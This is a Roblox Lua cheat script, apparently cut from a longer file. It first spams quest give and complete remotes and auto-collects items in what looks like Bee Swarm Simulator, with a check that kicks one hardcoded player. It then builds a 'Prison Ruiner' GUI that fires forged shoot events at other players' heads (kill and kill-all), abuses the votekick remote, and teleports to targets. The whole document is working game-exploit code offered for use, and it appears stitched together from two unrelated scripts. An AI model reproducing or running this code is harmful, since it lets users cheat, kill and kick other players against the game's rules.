game.ReplicatedStorage.Events.GiveQuest:FireServer("Search For The White Clover")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Stomping Grounds")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Stomping Grounds")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Collecting Cliffside")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Collecting Cliffside")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Mountain Meandering")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Mountain Meandering")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Quest Of Legends")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Quest Of Legends")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("High Altitude")
game.ReplicatedStorage.Events.GiveQuest:FireServer("High Altitude")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Blissfully Blue")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Blissfully Blue")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Rouge Round-up")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Rouge Round-up")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("White As Snow")
game.ReplicatedStorage.Events.GiveQuest:FireServer("White As Snow")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Solo On The Stump")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Solo On The Stump")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Colorful Craving")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Colorful Craving")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pumpkins, Please!")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pumpkins, Please!")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Smorgasbord")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Smorgasbord")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pollen Fetcher 5")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pollen Fetcher 5")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("White Clover Redux")
game.ReplicatedStorage.Events.GiveQuest:FireServer("White Clover Redux")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Strawberry Field Forever")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Strawberry Field Forever")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Tasting The Sky")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Tasting The Sky")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Whispy and Crispy")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Whispy and Crispy")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Walk Through The Woods")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Walk Through The Woods")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Get Red-y")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Get Red-y")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("One Stop On The Tip Top")
game.ReplicatedStorage.Events.GiveQuest:FireServer("One Stop On The Tip Top")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Blue Mushrooms 2")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Blue Mushrooms 2")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pretty Pumpkins")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pretty Pumpkins")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Black Bear, Why?")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Black Bear, Why?")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bee A Star")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bee A Star")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Spirit's Starter")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Spirit's Starter")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The First Offering")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The First Offering")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Rules of The Road")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Rules of The Road")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("QR Quest")
game.ReplicatedStorage.Events.GiveQuest:FireServer("QR Quest")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pleasant Pastimes")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pleasant Pastimes")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Nature's Lessons")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Nature's Lessons")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The Gifts Of Life")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The Gifts Of Life")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Out-Questing Questions")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Out-Questing Questions")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Forcefully Friendly")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Forcefully Friendly")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Sway Away")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Sway Away")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Memories of Memories")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Memories of Memories")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Beans Becoming")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Beans Becoming")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Do You Bee-lieve In Magic?")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Do You Bee-lieve In Magic?")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The Ways Of The Winds / The Wind And Its Way")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The Ways Of The Winds / The Wind And Its Way")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Beauty Duty")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Beauty Duty")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Witness Grandeur")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Witness Grandeur")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Beeternity")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Beeternity")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("A Breath Of Blue")
game.ReplicatedStorage.Events.GiveQuest:FireServer("A Breath Of Blue")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Glory Of Goo")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Glory Of Goo")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Tickle The Wind")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Tickle The Wind")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Rhubarb That Could Have Been")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Rhubarb That Could Have Been")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Dreams Of Being A Bee")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Dreams Of Being A Bee")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("The Sky Over The Stump")
game.ReplicatedStorage.Events.GiveQuest:FireServer("The Sky Over The Stump")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Space Oblivion")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Space Oblivion")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Pollenpalooza")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Pollenpalooza")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Dancing With Stick Bug")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Dancing With Stick Bug")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bean Bug Busser")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bean Bug Busser")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bombs, Blueberries, and Bean Bugs")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bombs, Blueberries, and Bean Bugs")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bean Bugs And Boosts")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bean Bugs And Boosts")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Make It Hasty")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Make It Hasty")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Total Focus")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Total Focus")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("On Your Marks")
game.ReplicatedStorage.Events.GiveQuest:FireServer("On Your Marks")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Look In The Leaves")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Look In The Leaves")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("What About Sprouts")
game.ReplicatedStorage.Events.GiveQuest:FireServer("What About Sprouts")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bean Bug Beatdown")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bean Bug Beatdown")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Bear Without Despair")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Bear Without Despair")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Spirit Spree")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Spirit Spree")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Echoing Call")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Echoing Call")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Spring Out Of The Mountain")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Spring Out Of The Mountain")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Goo")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Goo")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Medley")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Medley")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Mushrooms")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Mushrooms")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Picnic")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Picnic")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Pollen")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Pollen")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Rampage")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Rampage")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Roses")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Roses")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Scavenge")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Scavenge")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Skirmish")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Skirmish")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Strawberries")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Strawberries")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Tango")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Tango")
game.ReplicatedStorage.Events.GiveQuest:FireServer("Riley Bee: Tour")
game.ReplicatedStorage.Events.CompleteQuest:FireServer("Riley Bee: Tour")
until not act5
end
end)
spawn(function()
while wait() do
local truonghopdacbiet = 675056229
local truonghopdacbiet2 = "quocvietht456"
if game.Players.LocalPlayer.UserId == truonghopdacbiet or game.Players.LocalPlayer.Name == truonghopdacbiet2 then
    if act6 == true or act5 == true or afksnail == true or killvici == true or Sparkles == true or tornado == true or dispenser == true or killtunell == true or killcoconut == true or item == true or tpwindy == true or Windy == true then
        game.Players.LocalPlayer:Kick("Xai xai cdmm")
end
end
end
end)
 
Killstumnail.MouseButton1Down:connect(function()
if afksnail == false then
afksnail = true
Killstumnail.BackgroundColor3 = red
MainPage.Visible = false
Close.Text ="+"
local test = "C"
local tweenservice = game:GetService("TweenService")
local plr = game.Players.LocalPlayer
local info = TweenInfo.new(0.1) -- change to how long it takes to get to the item (in seconds)
local item = {}
while afksnail do
wait(1)    
for _,v in pairs(game.workspace:GetDescendants()) do
if string.find(v.Name,"LeafBurst") then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Parent.CFrame * CFrame.new(0,0,0)
end
end
for k,v in pairs(workspace.Collectibles:GetChildren()) do
 if tostring(v) == tostring(game.Players.LocalPlayer.Name) or tostring(v) == test then
                        if (v.Position-plr.Character.HumanoidRootPart.Position).magnitude <= 60 then
item.CFrame = CFrame.new(v.Position.x,plr.Character.HumanoidRootPart.Position.y,v.Position.z)
local Tween = tweenservice:Create(plr.Character.HumanoidRootPart, info, item)
Tween:Play()
end
end
end
end
else
afksnail = false
Killstumnail.BackgroundColor3 = blue
end
end)
end)
local creds = window:Tab("监狱人生菜单）",'6035145364')

local tool = creds:section("功能",true)
tool:Button("进入系统",function()
        function GetPlayer(String)
   local Found = {}
   local strl = String:lower()
       for i,v in pairs(game.Players:GetPlayers()) do
           if v.Name:lower():sub(1, #String) == String:lower() then
               table.insert(Found,v.Name)
           end
       end    
   return Found    
end
local PrisonRuinerGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local Kill = Instance.new("TextButton")
local Merge = Instance.new("TextButton")
local Kick = Instance.new("TextButton")
local KillAll = Instance.new("TextButton")
local Sword = Instance.new("TextButton")
local Player = Instance.new("TextBox")
local TextLabel_2 = Instance.new("TextLabel")
local Line = Instance.new("TextLabel")
local Spectate = Instance.new("TextButton")
local Goto = Instance.new("TextButton")
local Unspectate = Instance.new("TextButton")
PrisonRuinerGui.Name = "监狱 Ruiner Gui"
PrisonRuinerGui.Parent = game.CoreGui
PrisonRuinerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame.Active = true
Frame.Draggable = true
Frame.Parent = PrisonRuinerGui
Frame.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame.BorderColor3 = Color3.new(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.0496657118, 0, 0.473186165, 0)
Frame.Size = UDim2.new(0, 337, 0, 319)
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
TextLabel.BorderColor3 = Color3.new(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 337, 0, 42)
TextLabel.Font = Enum.Font.Cartoon
TextLabel.Text = "监狱 Ruiner Gui"
TextLabel.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextLabel.TextScaled = true
TextLabel.TextSize = 14
TextLabel.TextWrapped = true
Kill.Name = "杀"
Kill.Parent = Frame
Kill.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Kill.BorderColor3 = Color3.new(0, 0, 0)
Kill.BorderSizePixel = 0
Kill.Position = UDim2.new(0.0579999983, 0, 0.173843265, 0)
Kill.Size = UDim2.new(0, 131, 0, 33)
Kill.Font = Enum.Font.Cartoon
Kill.Text = "杀"
Kill.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Kill.TextScaled = true
Kill.TextSize = 14
Kill.TextWrapped = true
Merge.Name = "合并"
Merge.Parent = Frame
Merge.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Merge.BorderColor3 = Color3.new(0, 0, 0)
Merge.BorderSizePixel = 0
Merge.Position = UDim2.new(0.550999999, 0, 0.173131928, 0)
Merge.Size = UDim2.new(0, 131, 0, 33)
Merge.Font = Enum.Font.Cartoon
Merge.Text = "合并"
Merge.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Merge.TextScaled = true
Merge.TextSize = 14
Merge.TextWrapped = true
Kick.Name = "踢"
Kick.Parent = Frame
Kick.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Kick.BorderColor3 = Color3.new(0, 0, 0)
Kick.BorderSizePixel = 0
Kick.Position = UDim2.new(0.0579999983, 0, 0.300999999, 0)
Kick.Size = UDim2.new(0, 131, 0, 33)
Kick.Font = Enum.Font.Cartoon
Kick.Text = "踢"
Kick.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Kick.TextScaled = true
Kick.TextSize = 14
Kick.TextWrapped = true
KillAll.Name = "杀死所有人"
KillAll.Parent = Frame
KillAll.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
KillAll.BorderColor3 = Color3.new(0, 0, 0)
KillAll.BorderSizePixel = 0
KillAll.Position = UDim2.new(0.550999999, 0, 0.302032351, 0)
KillAll.Size = UDim2.new(0, 131, 0, 33)
KillAll.Font = Enum.Font.Cartoon
KillAll.Text = "杀死所有人"
KillAll.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
KillAll.TextScaled = true
KillAll.TextSize = 14
KillAll.TextWrapped = true
Sword.Name = "剑"
Sword.Parent = Frame
Sword.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Sword.BorderColor3 = Color3.new(0, 0, 0)
Sword.BorderSizePixel = 0
Sword.Position = UDim2.new(0.0579999685, 0, 0.855558157, 0)
Sword.Size = UDim2.new(0, 131, 0, 33)
Sword.Font = Enum.Font.Cartoon
Sword.Text = "剑"
Sword.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Sword.TextScaled = true
Sword.TextSize = 14
Sword.TextWrapped = true
Player.Name = "玩家"
Player.Parent = Frame
Player.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Player.BorderColor3 = Color3.new(0, 0, 0)
Player.BorderSizePixel = 0
Player.Position = UDim2.new(0.202000022, 0, 0.609539211, 0)
Player.Size = UDim2.new(0, 200, 0, 33)
Player.Font = Enum.Font.Cartoon
Player.PlaceholderColor3 = Color3.new(0.490196, 0.490196, 0.490196)
Player.PlaceholderText = "Player"
Player.Text = ""
Player.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Player.TextScaled = true
Player.TextSize = 14
Player.TextWrapped = true
TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
TextLabel_2.BorderColor3 = Color3.new(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.855000019, 0, 0.654999971, 0)
TextLabel_2.Size = UDim2.new(0, 49, 0, 40)
TextLabel_2.Font = Enum.Font.Cartoon
TextLabel_2.Text = "Gui by Uctron"
TextLabel_2.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14
TextLabel_2.TextWrapped = true
Line.Name = "线"
Line.Parent = Frame
Line.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Line.BorderColor3 = Color3.new(0, 0, 0)
Line.BorderSizePixel = 0
Line.Position = UDim2.new(0, 0, 0.78076911, 0)
Line.Size = UDim2.new(0, 337, 0, 10)
Line.Font = Enum.Font.Cartoon
Line.Text = ""
Line.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Line.TextScaled = true
Line.TextSize = 14
Line.TextWrapped = true
Spectate.Name = "注意"
Spectate.Parent = Frame
Spectate.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Spectate.BorderColor3 = Color3.new(0, 0, 0)
Spectate.BorderSizePixel = 0
Spectate.Position = UDim2.new(0.0579999983, 0, 0.42899999, 0)
Spectate.Size = UDim2.new(0, 131, 0, 33)
Spectate.Font = Enum.Font.Cartoon
Spectate.Text = "注意"
Spectate.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Spectate.TextScaled = true
Spectate.TextSize = 14
Spectate.TextWrapped = true
Goto.Name = "去"
Goto.Parent = Frame
Goto.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Goto.BorderColor3 = Color3.new(0, 0, 0)
Goto.BorderSizePixel = 0
Goto.Position = UDim2.new(0.551999986, 0, 0.430999994, 0)
Goto.Size = UDim2.new(0, 131, 0, 33)
Goto.Font = Enum.Font.Cartoon
Goto.Text = "去"
Goto.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Goto.TextScaled = true
Goto.TextSize = 14
Goto.TextWrapped = true
Unspectate.Name = "不受欢迎"
Unspectate.Parent = Frame
Unspectate.BackgroundColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Unspectate.BorderColor3 = Color3.new(0, 0, 0)
Unspectate.BorderSizePixel = 0
Unspectate.Position = UDim2.new(0.550581574, 0, 0.855558157, 0)
Unspectate.Size = UDim2.new(0, 131, 0, 33)
Unspectate.Font = Enum.Font.Cartoon
Unspectate.Text = "不受欢迎"
Unspectate.TextColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Unspectate.TextScaled = true
Unspectate.TextSize = 14
Unspectate.TextWrapped = true

Kill.MouseButton1Click:Connect(function()
local savedteam = game.Players.LocalPlayer.TeamColor.Name
workspace.Remote.TeamEvent:FireServer("Medium stone grey")
workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)	
for i,v in pairs(GetPlayer(Player.Text)) do
local A_1 = {[1] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-391.152252, 8.65560055, -83.2166901)), ["Distance"] = 3.2524313926697, ["Cframe"] = CFrame.new(840.310791, 101.334137, 2267.87988, 0.0636406094, 0.151434347, -0.986416459, 0, 0.988420188, 0.151741937, 0.997972965, -0.00965694897, 0.0629036576), ["Hit"] = game.Players[v].Character.Head}, [2] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-392.481476, -8.44939327, -76.7261353)), ["Distance"] = 3.2699294090271, ["Cframe"] = CFrame.new(840.290466, 101.184189, 2267.93506, 0.0964837447, 0.0589403138, -0.993587971, 4.65661287e-10, 0.998245299, 0.0592165813, 0.995334625, -0.00571343815, 0.0963144377), ["Hit"] = game.Players[v].Character.Head}, [3] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-389.21701, -2.50536323, -92.2163162)), ["Distance"] = 3.1665518283844, ["Cframe"] = CFrame.new(840.338867, 101.236496, 2267.80371, 0.0166504811, 0.0941716284, -0.995416701, 1.16415322e-10, 0.995554805, 0.0941846818, 0.999861419, -0.00156822044, 0.0165764652), ["Hit"] = game.Players[v].Character.Head}, [4] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-393.353973, 3.13988972, -72.5452042)), ["Distance"] = 3.3218522071838, ["Cframe"] = CFrame.new(840.277222, 101.285957, 2267.9707, 0.117109694, 0.118740402, -0.985994935, -1.86264515e-09, 0.992826641, 0.119563118, 0.993119001, -0.0140019981, 0.116269611), ["Hit"] = game.Players[v].Character.Head}, [5] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-390.73172, 3.2097764, -85.5477524)), ["Distance"] = 3.222757101059, ["Cframe"] = CFrame.new(840.317993, 101.286423, 2267.86035, 0.0517584644, 0.123365127, -0.991010666, 0, 0.992340803, 0.123530701, 0.99865967, -0.00639375951, 0.0513620302), ["Hit"] = game.Players[v].Character.Head}}
local A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)
Event:FireServer(A_1, A_2)
end
workspace.Remote.TeamEvent:FireServer(savedteam)
end)

KillAll.MouseButton1Click:Connect(function()
local savedteam = game.Players.LocalPlayer.TeamColor.Name
workspace.Remote.TeamEvent:FireServer("Medium stone grey")
workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)	
for i,v in pairs(game.Players:GetPlayers()) do
local A_1 = {[1] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-391.152252, 8.65560055, -83.2166901)), ["Distance"] = 3.2524313926697, ["Cframe"] = CFrame.new(840.310791, 101.334137, 2267.87988, 0.0636406094, 0.151434347, -0.986416459, 0, 0.988420188, 0.151741937, 0.997972965, -0.00965694897, 0.0629036576), ["Hit"] = v.Character.Head}, [2] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-392.481476, -8.44939327, -76.7261353)), ["Distance"] = 3.2699294090271, ["Cframe"] = CFrame.new(840.290466, 101.184189, 2267.93506, 0.0964837447, 0.0589403138, -0.993587971, 4.65661287e-10, 0.998245299, 0.0592165813, 0.995334625, -0.00571343815, 0.0963144377), ["Hit"] = v.Character.Head}, [3] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-389.21701, -2.50536323, -92.2163162)), ["Distance"] = 3.1665518283844, ["Cframe"] = CFrame.new(840.338867, 101.236496, 2267.80371, 0.0166504811, 0.0941716284, -0.995416701, 1.16415322e-10, 0.995554805, 0.0941846818, 0.999861419, -0.00156822044, 0.0165764652), ["Hit"] = v.Character.Head}, [4] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-393.353973, 3.13988972, -72.5452042)), ["Distance"] = 3.3218522071838, ["Cframe"] = CFrame.new(840.277222, 101.285957, 2267.9707, 0.117109694, 0.118740402, -0.985994935, -1.86264515e-09, 0.992826641, 0.119563118, 0.993119001, -0.0140019981, 0.116269611), ["Hit"] = v.Character.Head}, [5] = {["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-390.73172, 3.2097764, -85.5477524)), ["Distance"] = 3.222757101059, ["Cframe"] = CFrame.new(840.317993, 101.286423, 2267.86035, 0.0517584644, 0.123365127, -0.991010666, 0, 0.992340803, 0.123530701, 0.99865967, -0.00639375951, 0.0513620302), ["Hit"] = v.Character.Head}}
local A_2 = game.Players.LocalPlayer.Backpack["Remington 870"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)
Event:FireServer(A_1, A_2)
end
game.Players.LocalPlayer.Character:BreakJoints()
workspace.Remote.TeamEvent:FireServer(savedteam)
end)

Merge.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
repeat
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v].Character.HumanoidRootPart.CFrame
game:GetService("RunService").Heartbeat:Wait()
until game.Players.LocalPlayer.Character.Humanoid.Health == 0
end
end)

Kick.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
workspace.Remote.loadchar:InvokeServer(game.Players.LocalPlayer,game.Players[v].TeamColor.Name)
wait(.1)
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = "Starting...";
Text = "Now attempting to kick "..v;
Duration = 5;
})
for i=1,10 do
workspace.Remote.votekick:InvokeServer("Start",game.Players[v])
workspace.Remote.votekick:InvokeServer("Vote")
game:GetService("RunService").Stepped:Wait()
end
if not game.Players:FindFirstChild(v) then
game:GetService("StarterGui"):SetCore("SendNotification", {
Title = "Success!";
Text = v.." has been kicked.";
Duration = 5;
})
end
end
end)

Spectate.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
workspace.CurrentCamera.CameraSubject = game.Players[v].Character.Humanoid
end
end)

Goto.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[v].Character.HumanoidRootPart.CFrame
end
end)

Unspectate.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
end
end)

Sword.MouseButton1Click:Connect(function()
for i,v in pairs(GetPlayer(Player.Text)) do
local Sword = Instance.new("Tool")
local Handle = Instance.new("Part")
local Mesh = Instance.new("SpecialMesh")
local Unsheath = Instance.new("Sound")
local SwordSlash = Instance.new("Sound")
SwordSlash.Name = "剑"
Unsheath.Name = "Unsheath"
Unsheath.SoundId = "http://www.roblox.com/asset/?id=12222225"
Unsheath.Volume = 1
SwordSlash.SoundId = "http://www.roblox.com/asset/?id=12222216"
SwordSlash.Volume = .7
Unsheath.Parent = Handle
SwordSlash.Parent = Handle
Mesh.Parent = Handle
Mesh.MeshId = "rbxassetid://497078148"
Mesh.Scale = Vector3.new(5,5,5)
Handle.Name = "处理"
Handle.Parent = Sword
Sword.GripForward = Vector3.new(-1,0,0)
Sword.GripPos = Vector3.new(0,0,-1.5)
Sword.GripRight = Vector3.new(0,1,0)
Sword.GripUp = Vector3.new(0,0,1)
Sword.ToolTip = "Uctron's Sword"
Sword.TextureId = "rbxasset://Textures/Sword128.png"
Sword.CanBeDropped = false
Sword.RequiresHandle = true
Handle.Orientation = Vector3.new(-46.24, 42.14, 50.93)
Handle.Position = Vector3.new(-3.174,1.57,3.04)
Handle.CanCollide = true
Handle.Size = Vector3.new(1,.8,4)
Mesh.MeshId = "rbxasset://fonts/sword.mesh"
Mesh.MeshType = "FileMesh"
Mesh.Offset = Vector3.new(0,0,0)
Mesh.Scale = Vector3.new(1,1,1)
Mesh.TextureId = "rbxasset://textures/SwordTexture.png"
Sword.Equipped:Connect(function()
Unsheath:Play()
end)
Sword.Activated:Connect(function()
SwordSlash:Play()
Handle.Touched:Connect(function(Handle)
p=game.Players:FindFirstChild(Handle.Parent.Name)
game.ReplicatedStorage.meleeEvent:FireServer(p)
end)
